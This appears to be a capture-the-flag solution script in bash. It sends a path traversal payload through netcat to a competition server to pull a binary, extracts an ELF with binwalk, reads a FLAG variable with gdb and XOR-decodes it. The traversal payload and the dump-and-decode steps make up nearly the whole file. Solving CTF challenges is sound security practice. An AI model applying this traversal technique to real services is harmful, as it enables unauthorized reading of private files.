#!/bin/bash

echo "Dumping Binary File..."
echo -e "2\n../../../../../home/user/main"|nc -w 2 mngmnt-iface.ctfcompetition.com 1337 >tmp

echo "Stripping extra data"
binwalk -e tmp
mv _tmp.extracted/B6.elf .
rm tmp _tmp* -fr

echo "Grabbing Global Variable '_ZL4FLAG'"
pwd="$(gdb -batch -ex 'file ./B6.elf' -ex 'x/s _ZL4FLAG'|cut -d\" -f2|cut -d\/ -f1)"

echo "print(\"\".join([chr(ord(x)^int(\"0xC7\", 16)) for x in list('$pwd')]).split(\"}\")[0]+'}')" > tmp.py

python ./tmp.py
rm tmp.py



